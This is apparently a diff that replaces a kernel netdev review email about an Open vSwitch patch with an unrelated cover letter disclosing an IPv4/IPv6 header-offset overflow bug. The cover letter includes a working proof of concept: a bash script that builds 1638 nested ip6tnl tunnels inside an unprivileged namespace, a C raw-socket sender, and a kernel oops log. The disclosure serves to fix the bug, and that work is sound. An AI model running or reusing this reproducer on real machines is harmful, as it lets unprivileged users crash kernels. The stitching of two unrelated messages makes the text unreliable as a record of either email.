@@ -1,211 +1,390 @@
-Received: from mail-wr2-f0.google.com (mail-wr2-f0.google.com [74.125.225.64])
+Received: from mail-pl1-f172.google.com (mail-pl1-f172.google.com [209.85.214.172])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id BB75642D75F
-	for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 18:01:33 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.225.64
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7C4C53D76
+	for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 18:03:14 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.172
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1785175297; cv=none; b=s3Tt1rbN3H+Qztj1dLrxy4xxS7EhwF6CBZVFk3jnBY/KBZIqn2ViH9RXbwA/I6THk4DfIs5VpSllKON2bOXHXATTYtVy7xSdXGvmI29aDHReahqOm1itUFLS28hU0JXycyG/z3qakTXF/4yRLIi9H7E2rPJohKuBBpaXj0KKcU8=
+	t=1785175396; cv=none; b=q0QZ202TWqEEl764t0g2ddy4SR7hwhZgQT8NR7B88NZY6+KPGUGrLeSva4/sWyoxHsYzwuWfPUmAjTULfKxAsVQm0Cta+X92wdz41xnqBZy8X3pqV2TdRWoJjVYI1f99PI6iKRbkYZhld9WGoPlsqfZGuIoAqmxdG3jusZSmPj8=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1785175297; c=relaxed/simple;
-	bh=b+n/2iB2uHX/RV9B+uAXOurS+RjncC8Tku/DSzHEW2M=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=kEEkIJljtPId4rTuDFLASr+iQwh1rmA/1wFsfsVB2R6BEH041FaCNCofukBlFRVi4KsMmOzlu/jZn8Zjzkrj4C1r7KTCwRwXEWRYhRdqRkyeXFB1ZXdt/AdUGhDDCFP1IVn73PGp889dK1AEEkuJw5jLjEgSmj9oOMhA6IE9Ok4=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=ovn.org; spf=pass smtp.mailfrom=gmail.com; arc=none smtp.client-ip=74.125.225.64
-Authentication-Results: smtp.subspace.kernel.org; dmarc=none (p=none dis=none) header.from=ovn.org
+	s=arc-20240116; t=1785175396; c=relaxed/simple;
+	bh=X87k2vTVqgwne/RQyGwp8yC7ukZMs4d8cfrAKLbFFIg=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=PrMu0OEOHUynWCOn6Ahg1uxukyEUxAkRjvv2vzfcpJzHXj3hcQkOanFGbPXFr4kLi3YwSqvkwNbDuHKO6eR8H84ty5BoHX59rZAOc+pPJXgIwNvTGFQOfA2fh6K84P0AxvSSphx02vozx+1BSIYNo8mqxcPFvmAm3962t7Oi+Fc=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=gG342Zhz; arc=none smtp.client-ip=209.85.214.172
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
 Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
-Received: by mail-wr2-f0.google.com with SMTP id ffacd0b85a97d-47f8fd5f16aso1404846f8f.0
-        for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 11:01:33 -0700 (PDT)
+Authentication-Results: smtp.subspace.kernel.org;
+	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="gG342Zhz"
+Received: by mail-pl1-f172.google.com with SMTP id d9443c01a7336-2cfff5f88dbso11184725ad.3
+        for <netdev@vger.kernel.org>; Mon, 27 Jul 2026 11:03:14 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20251104; t=1785175394; x=1785780194; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=lly/RCryi1oHKJz8rNMwNeEjmJs1civV/Pwm798LMDc=;
+        b=gG342ZhzWc5C3GuwSK3H61nVmJkonSCE/EoKpZ4wo5Aj6fc1zLGAqmmRIN8M9JPQO/
+         OgtfCWA6ZEwhYjMwSDE/IjvJe8qud2JN8+DuG6K5auEpvZyS3CuoAF7DvEooKz/+8KzE
+         4GmnjdF6+iEqpfBOnPPjk4yTtz6qJjPCjFJ2Ep1EQGErsnZR9ATMnRE5h8vuEzUXJit0
+         dMsv1dcGVjDFwKjXDhH/WWviB1iKVd38LlpGLU0O+33LWMn0J1+MXZwm/N9hTxtSlDD2
+         erwzZqkuLRiNfKka2QfZnZtpSdJU393YJa+4x+8k0kfGJyWBXH9nxhL3AqAlbx6WovqB
+         Opmw==
 X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20251104; t=1785175292; x=1785780092;
-        h=content-transfer-encoding:content-type:in-reply-to:autocrypt:from
-         :content-language:references:cc:to:subject:user-agent:mime-version
-         :date:message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+        d=1e100.net; s=20251104; t=1785175394; x=1785780194;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
          :message-id:reply-to:content-type;
-        bh=pQbucOyUiEoW2tUJJeNL0F0/fNmQ8BYd2yE1zScqXc4=;
-        b=Kt4iiejVJcrtZZek41tHq8Q2cOPBTUg97U9uqffAf463EE/E2z2EKCjwbB2R1NOwgh
-         mTl/kx7ttM3c2VTpeJRoW+omLviDXP6HT+jiW/dr8iFLd5O/7LsoEC5tOGRHpZSU/Fzl
-         A5MnOWu3+38nnLxw4ubao3BlbVBlAW2CKJDgrdHwOtm1HBg62kG4ttoRMbmYm0FsmXBv
-         yw/e8EhdW47rhjBTrHeq9LsfebMh7lC0dEcvyliEulXc/UUbsTnTWyv749zvSwK21Psh
-         XWAL9gBgmSj0nnMNz9bKdaTd5ka5PBmPXrIBLc6hZcWObNErB9EiTJURcj7fA5hw0upV
-         GEbg==
-X-Gm-Message-State: AOJu0YzgdFHKh8a+UlxBPkqWwj8baRM3p7rZNGgrnf/HVtyrCfdJGlvH
-	Any2ERNaitJcHFqzZnwXrDAIiySZR35CQmmuuEcno4klmnTlf095Vc3N
-X-Gm-Gg: AR+sD11X4wRuqUvr4XTaZHwUbUHjQnF1iXXNuE3W8ylJ8uLR+AQ0GnZo9tDpW2TUbiL
-	1qUFPXn8rdY+lf+iTxHo9EEu5FiIR3PzJrMt1FlDs9S+B87WFjfhE4QQC+VhkE9Cirg6YhVrUsV
-	e8ELk0wiIJ66vgWkyvwc49hNED4p1C93xKiP/S7CAVO6dVcNKdLubks0jb/qp9lA6WYZt31Rzrz
-	HuyKQiZsMenyqXrh1jfqZ6gj1WE4HYnN0TeH2HrAYxCEQhbgFOXUm2s/jVl32EvsOQzLY6mtmtt
-	UEyEjkY2x8X6/hX7o4R7XQpzXJqIt5758JYD0Vyh/woGXLJEp0ARkRVkiUQhOgHypislRjTEqAI
-	i4mUZHHSPP6iacB/QLaRpA9VSz6q2/krfLPuaasksKcGbTC3YJIfuQg9b+s7jCwuzH2mh63EjdM
-	keTz9KrhKWzfal4PafFF3N+WYcqGM8bMkpbvgTEDw=
-X-Received: by 2002:a05:6000:2dca:b0:47f:87f9:6d06 with SMTP id ffacd0b85a97d-47fafa80cfcmr197487f8f.61.1785175291790;
-        Mon, 27 Jul 2026 11:01:31 -0700 (PDT)
-Received: from [192.168.88.241] (78-80-108-129.customers.tmcz.cz. [78.80.108.129])
-        by smtp.gmail.com with ESMTPSA id ffacd0b85a97d-47f85c6f076sm51301231f8f.34.2026.07.27.11.01.29
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Mon, 27 Jul 2026 11:01:31 -0700 (PDT)
-Message-ID: <403ae4a4-5df3-4744-89e4-12e46fd56f25@ovn.org>
-Date: Mon, 27 Jul 2026 20:01:28 +0200
+        bh=lly/RCryi1oHKJz8rNMwNeEjmJs1civV/Pwm798LMDc=;
+        b=Kzrn5JDaETyN36NWWn0AZwlSUwmhi5TM8Tha3j3bfA0XFupAeBn2eUul+td0s/uCc3
+         7WX7ZqNRSk21XtNTf9/SzlCgquM448HupzZujyfOVbhqx2noZ71l3C6x3Cft7eoP0KNj
+         wtwQzNcRHtKnFRxS/EW6FTSsEldVEFRqb5T+7Yqs7RkOyAnkMWsG96/freujlk6LrekD
+         4yXlayf0GG6Pnl1Hpzy4vnDyQl1rWJanAgPPpVyAR0YsIrNgOBlpHkxbDu+n6vfUjhb4
+         gtIFlFWf5earIvKFxPdCNAKNuHaZX56B/hVndeP8GIJRHtU4z6XrWua3VI8+jv5ovwIJ
+         MZVg==
+X-Gm-Message-State: AOJu0YyLzSbbtWKGz8m6wPOLhzYzEHNKStvEy+UwuS8YX5R9Uktrx97D
+	eCO7PxTb9CZCAVnXk9/k1SLgbMgNY7381z7LRnSJDZxgn23KkBPQ5IgJ7VTwoeFZU9W/ug==
+X-Gm-Gg: AR+sD13UkqYAAPvPmhii2PRAMLNCNYWfEAqMDo8U3GCWl1qUCXasN9ijgkWqW3MCTfL
+	L0OCTfmrH7jyz4ZxPOHuLQC7iDkBKoD3kqgbxC1hkLZ/sbbGjOD8LYrFFs9g9CKbXQzVEzoItl0
+	dOs8IyBxYek94vcjPmSihSNJIxcJNm6+T8RnPhw8Vaqx1i6YWJPF4zLH5XkAH8eftzi6xYIa4wi
+	3zwzmQmBODlVMVqpPNLrw4lrvPTcBc286g09+/PU6iqSYj8aRFjWXn4vuK6An7k1C6nE/w7bO8j
+	1PJ3sztBqEqutaxh+Zzul7irYaUNq6c6YEnTPQAm4VjdiKqU2sx9lsel1XwRLpbaCRREWtunFdl
+	jZ7THdSRZhYSg//8mu7lxxlcjps8Sq0e6M2D5z/awXi3mBB5slaK8urcdmJ0lE0eDGS+r5g6/xn
+	DaDZQNT5+JJM3oHRPGwVvE
+X-Received: by 2002:a17:903:2f0e:b0:2ca:ed41:d33d with SMTP id d9443c01a7336-2d00f44e0cfmr3183175ad.45.1785175393899;
+        Mon, 27 Jul 2026 11:03:13 -0700 (PDT)
+Received: from enjou-Legion-Y7000P-2019 ([219.141.235.82])
+        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2cfde7bc338sm39171155ad.43.2026.07.27.11.03.08
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Mon, 27 Jul 2026 11:03:13 -0700 (PDT)
+From: Ren Wei <enjou1224z@gmail.com>
+To: netdev@vger.kernel.org
+Cc: dsahern@kernel.org,
+	idosch@nvidia.com,
+	davem@davemloft.net,
+	edumazet@google.com,
+	pabeni@redhat.com,
+	horms@kernel.org,
+	kuniyu@google.com,
+	jlayton@kernel.org,
+	runyu.xiao@seu.edu.cn,
+	kees@kernel.org,
+	michael.bommarito@gmail.com,
+	gustavoars@kernel.org,
+	willemb@google.com,
+	lirongqing@baidu.com,
+	vega@nebusec.ai,
+	zhilinz@nebusec.ai,
+	enjou1224z@gmail.com
+Subject: [PATCH net 0/1] net: reject IP sends with excessive headroom
+Date: Tue, 28 Jul 2026 02:03:05 +0800
+Message-ID: <cover.1785054561.git.zhilinz@nebusec.ai>
+X-Mailer: git-send-email 2.51.0
 Precedence: bulk
 X-Mailing-List: netdev@vger.kernel.org
 List-Id: <netdev.vger.kernel.org>
 List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH net v4] net/openvswitch: check Ethernet header length in
- key_extract()
-To: "Cen Zhang (Microsoft)" <blbllhy@gmail.com>, aconole@redhat.com,
- echaudro@redhat.com, i.maximets@ovn.org, davem@davemloft.net,
- edumazet@google.com, kuba@kernel.org, pabeni@redhat.com, horms@kernel.org
-Cc: netdev@vger.kernel.org, dev@openvswitch.org,
- linux-kernel@vger.kernel.org, AutonomousCodeSecurity@microsoft.com,
- tgopinath@linux.microsoft.com, kys@microsoft.com
-References: <20260725043128.193164-1-blbllhy@gmail.com>
-Content-Language: en-US
-From: Ilya Maximets <i.maximets@ovn.org>
-Autocrypt: addr=i.maximets@ovn.org; keydata=
- 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
-In-Reply-To: <20260725043128.193164-1-blbllhy@gmail.com>
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: 8bit
 
-On 7/25/26 6:31 AM, Cen Zhang (Microsoft) wrote:
-> When a packet arrives on an ARPHRD_NONE device (e.g. TUN),
-> ovs_flow_key_extract() trusts the user-provided skb->protocol field: if
-> it is ETH_P_TEB, the packet is classified as MAC_PROTO_ETHERNET and
-> key_extract() is called without ensuring the skb has ETH_HLEN (14) bytes
-> of linear data. key_extract() unconditionally pulls 2 * ETH_ALEN bytes
-> for MAC addresses and parse_ethertype() pulls 2 more, either of which
-> triggers a kernel BUG in __skb_pull() when the linear area is too small.
-> 
->   kernel BUG at include/linux/skbuff.h:2848!
->   RIP: 0010:key_extract+0xa7e/0xd90 net/openvswitch/flow.c:933
->   ovs_flow_key_extract+0x419/0xa70
->   ovs_vport_receive+0x222/0x390
->   netdev_frame_hook+0x3e0/0x630
->   tun_get_user+0x2d0c/0x38e0
-> 
-> Fixed by calling check_header() in key_extract() before accessing the
-> Ethernet header.
-> 
-> Fixes: 217ac77a3c25 ("openvswitch: allow L3 netdev ports")
-> Reported-by: AutonomousCodeSecurity@microsoft.com
-> Signed-off-by: Cen Zhang (Microsoft) <blbllhy@gmail.com>
-> ---
-> v4: Update documentation and move variables into the Ethernet block.
-> v3: Use check_header() per review, fix format issue.
-> v2: Moved the check into key_extract() per Ilya Maximets.
-> Link: https://lore.kernel.org/all/20260721143602.64677-1-blbllhy@gmail.com
-> 
->  net/openvswitch/flow.c | 10 ++++++----
->  1 file changed, 6 insertions(+), 4 deletions(-)
-> 
-> diff --git a/net/openvswitch/flow.c b/net/openvswitch/flow.c
-> index 66366982f604..8ad0be37a65a 100644
-> --- a/net/openvswitch/flow.c
-> +++ b/net/openvswitch/flow.c
-> @@ -889,8 +889,6 @@ static int key_extract_l3l4(struct sk_buff *skb, struct sw_flow_key *key)
->   * Ethernet header
->   * @key: output flow key
->   *
-> - * The caller must ensure that skb->len >= ETH_HLEN.
-> - *
->   * Initializes @skb header fields as follows:
->   *
->   *    - skb->mac_header: the L2 header.
-> @@ -910,8 +908,6 @@ static int key_extract_l3l4(struct sk_buff *skb, struct sw_flow_key *key)
->   */
->  static int key_extract(struct sk_buff *skb, struct sw_flow_key *key)
->  {
-> -	struct ethhdr *eth;
-> -
->  	/* Flags are always used as part of stats */
->  	key->tp.flags = 0;
->  
-> @@ -926,6 +922,12 @@ static int key_extract(struct sk_buff *skb, struct sw_flow_key *key)
->  		skb_reset_network_header(skb);
->  		key->eth.type = skb->protocol;
->  	} else {
-> +		struct ethhdr *eth;
-> +		int err = check_header(skb, ETH_HLEN);
+From: Zhiling Zou <zhilinz@nebusec.ai>
 
-Please, use the reverse x-mass tree ordering for variable declaration,
-i.e. lines longest to shortest.  In this particular case, just move
-the initialization to a separate line:
+Hi Linux kernel maintainers,
 
-		struct ethhdr *eth;
-		int err;
+We found and validated an issue in net/ipv6/raw.c. The bug is reachable
+by a non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
 
-		err = check_header(skb, ETH_HLEN);
-		if (unlikely(err)) ...
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
-Otherwise, LGTM.
+---- details below ----
 
+Bug details:
 
+IPv4 and IPv6 output paths reserve LL_RESERVED_SPACE(dev) before recording skb
+network and transport header offsets. Those offsets are stored in 16-bit skb
+fields.
 
-Sashiko reports two pre-existing issues that are not related to this patch:
+A namespace-local stack of tunnel devices can make hard_header_len plus
+needed_headroom exceed the range of those fields. In rawv6_send_hdrinc(), the
+wrapped skb->network_header makes ipv6_hdr(skb) point back into headroom
+instead of the packet area just reserved by skb_put(). The user-supplied IPv6
+packet is copied to that wrapped header pointer while the actual packet data
+remains stale. Later IPv6 output and error handling can operate on invalid
+headers and crash, as seen in __skb_flow_dissect().
 
-1. Potential use of uninitialized bits of the key during lookup if the
-   code takes the positive branch of the if statement, since the addresses
-   remain uninitialized in the flow key structure.
+The same root cause is present in the ordinary IPv4 and IPv6 append/cork
+paths, which reserve device headroom and then store network_header plus
+fragheaderlen in skb->transport_header. IPv4 raw HDRINCL also adds the
+user-provided ihl to skb->transport_header after parsing the header.
 
-   There should be no functional issues, as those bits will be bitwise
-   ANDed with zeroes form the mask before the lookup in most cases, and
-   in case of L3 key comparison with the L2 flow where the addresses
-   will not be zero, the key must not match anyway due to prior mismatch
-   on the eth protocol.  However, it is possible that KASAN will not be
-   happy with these operations producing warnings.  I'll try to take a
-   closer look at this one.  The zeroing out of the key was previously
-   removed for performance reasons, since it doesn't affect flow matching.
-   But having KASAN splats is also not great and potentially dangerous.
+The fix rejects IPv4 and IPv6 sends before the affected header offsets are
+stored if the largest offset for that path cannot be encoded in the skb header
+fields.
 
-2. There is an unlikely case where ovs_flow_key_update() might fail,
-   which would cause skb leak on failure of recirc() or ct() actions.
-   I'm not really sure if this condition is reachable in practice as it
-   requires parsing to fail on a packet that we previously successfully
-   parsed and then modified.  But should be fixed nevertheless.
-   I'll send a separate small patch set for this.
+Reproducer:
 
-Best regards, Ilya Maximets.
+    make
+    unshare -Urn ./poc.sh
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.sh------
+
+#!/bin/bash
+set -euo pipefail
+
+if [[ "$(id -u)" -ne 0 ]]; then
+	echo "run as root or inside 'unshare -Urn'" >&2
+	exit 1
+fi
+
+DIR="$(cd "$(dirname "$0")" && pwd)"
+
+sysctl -qw net.ipv6.conf.all.accept_dad=0
+sysctl -qw net.ipv6.conf.default.accept_dad=0
+sysctl -qw net.ipv6.conf.all.router_solicitations=0
+sysctl -qw net.ipv6.conf.default.router_solicitations=0
+sysctl -qw net.ipv6.conf.all.accept_ra=0
+sysctl -qw net.ipv6.conf.default.accept_ra=0
+sysctl -qw net.ipv6.conf.all.autoconf=0
+sysctl -qw net.ipv6.conf.default.autoconf=0
+
+ip link add x0 type veth peer name x1
+ip link set x0 up
+ip link set x1 up
+ip -6 addr add fd40::1/64 dev x0 nodad
+ip -6 addr add fd40::2/64 dev x1 nodad
+
+prev=x0
+for i in $(seq 0 1637); do
+	name="w$i"
+	subnet="$(printf '%x' "$i")"
+	next="$(printf '%x' "$((i + 1))")"
+	ip link add "$name" type ip6tnl mode ip6ip6 \
+		local "fd40:${subnet}::1" remote "fd40:${subnet}::2" \
+		dev "$prev" encaplimit none
+	ip link set "$name" up
+	ip -6 addr add "fd40:${next}::1/64" dev "$name" nodad
+	prev="$name"
+	if (( (i + 1) % 400 == 0 )); then
+		echo "built $((i + 1)) / 1638 tunnels" >&2
+	fi
+done
+
+exec "$DIR/poc" w1637 fd40:666::1 fd40:666::2 160
+
+------END poc.sh--------
+
+------BEGIN poc.c------
+
+#define _GNU_SOURCE
+
+#include <arpa/inet.h>
+#include <errno.h>
+#include <net/if.h>
+#include <netinet/in.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <unistd.h>
+
+struct ipv6_hdr_raw {
+	uint32_t vtc_flow;
+	uint16_t payload_len;
+	uint8_t nexthdr;
+	uint8_t hop_limit;
+	struct in6_addr saddr;
+	struct in6_addr daddr;
+} __attribute__((packed));
+
+static void die(const char *msg)
+{
+	perror(msg);
+	exit(1);
+}
+
+int main(int argc, char **argv)
+{
+	const char *ifname;
+	const char *src_str;
+	const char *dst_str;
+	struct sockaddr_in6 dst = { 0 };
+	struct ipv6_hdr_raw *hdr;
+	unsigned char *packet;
+	int sock;
+	int hdrincl = 1;
+	size_t payload_len = 160;
+	size_t packet_len;
+	ssize_t sent;
+
+	if (argc < 4 || argc > 5) {
+		fprintf(stderr, "usage: %s <ifname> <src> <dst> [payload_len]\n", argv[0]);
+		return 1;
+	}
+
+	ifname = argv[1];
+	src_str = argv[2];
+	dst_str = argv[3];
+
+	if (argc == 5) {
+		char *end = NULL;
+		unsigned long tmp = strtoul(argv[4], &end, 0);
+
+		if (!end || *end != '\0' || tmp > 1200) {
+			fprintf(stderr, "invalid payload_len: %s\n", argv[4]);
+			return 1;
+		}
+		payload_len = tmp;
+	}
+
+	packet_len = sizeof(*hdr) + payload_len;
+	packet = calloc(1, packet_len);
+	if (!packet)
+		die("calloc");
+
+	hdr = (struct ipv6_hdr_raw *)packet;
+	hdr->vtc_flow = htonl(6u << 28);
+	hdr->payload_len = htons((uint16_t)payload_len);
+	hdr->nexthdr = 59;
+	hdr->hop_limit = 64;
+
+	if (inet_pton(AF_INET6, src_str, &hdr->saddr) != 1) {
+		fprintf(stderr, "invalid source IPv6 address: %s\n", src_str);
+		return 1;
+	}
+	if (inet_pton(AF_INET6, dst_str, &hdr->daddr) != 1) {
+		fprintf(stderr, "invalid destination IPv6 address: %s\n", dst_str);
+		return 1;
+	}
+
+	for (size_t i = 0; i < payload_len; i++)
+		packet[sizeof(*hdr) + i] = (unsigned char)i;
+
+	sock = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
+	if (sock < 0)
+		die("socket(AF_INET6, SOCK_RAW, IPPROTO_RAW)");
+
+	if (setsockopt(sock, SOL_SOCKET, SO_BINDTODEVICE, ifname, strlen(ifname) + 1) < 0)
+		die("setsockopt(SO_BINDTODEVICE)");
+
+	if (setsockopt(sock, IPPROTO_IPV6, IPV6_HDRINCL, &hdrincl, sizeof(hdrincl)) < 0)
+		die("setsockopt(IPV6_HDRINCL)");
+
+	dst.sin6_family = AF_INET6;
+	if (inet_pton(AF_INET6, dst_str, &dst.sin6_addr) != 1) {
+		fprintf(stderr, "invalid destination IPv6 address: %s\n", dst_str);
+		return 1;
+	}
+
+	sent = sendto(sock, packet, packet_len, 0, (struct sockaddr *)&dst, sizeof(dst));
+	if (sent < 0)
+		die("sendto");
+
+	printf("sent %zd bytes via %s\n", sent, ifname);
+	close(sock);
+	free(packet);
+	return 0;
+}
+
+------END poc.c--------
+
+----BEGIN crash log----
+
+[  234.045915] BUG: unable to handle page fault for address: ffff88821e640006
+[  234.047065] #PF: supervisor read access in kernel mode
+[  234.047877] #PF: error_code(0x0000) - not-present page
+[  234.048721] PGD 5a01067 P4D 5a01067 PUD 0
+[  234.049389] Oops: Oops: 0000 [#1] SMP NOPTI
+[  234.050125] CPU: 2 UID: 1028 PID: 9206 Comm: python3 Not tainted 6.12.95 #1
+[  234.051234] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
+[  234.053041] RIP: 0010:__skb_flow_dissect (/home/roxy/linux-block-patch/build/../include/linux/rcupdate.h:867 /home/roxy/linux-block-patch/build/../net/core/flow_dissector.c:1172)
